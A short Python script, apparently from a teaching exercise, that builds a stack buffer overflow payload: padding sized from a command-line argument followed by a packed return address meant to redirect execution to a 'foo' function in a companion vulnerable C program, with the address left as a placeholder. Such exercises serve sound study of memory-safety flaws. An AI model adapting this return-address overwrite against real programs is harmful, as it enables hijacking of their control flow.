import struct
import sys

# The address of the foo function in memory deduced using printf(%p, &foo) in buffer_overflow.c
foo_addr = 0X0
buffer_size=int(sys.argv[1])

# fill the buffer until the return_address
padding = b"0" * (buffer_size+12)

return_address = struct.pack("<I", foo_addr)
to_write = padding + return_address

with open("payload", "wb") as f:
    f.write(to_write)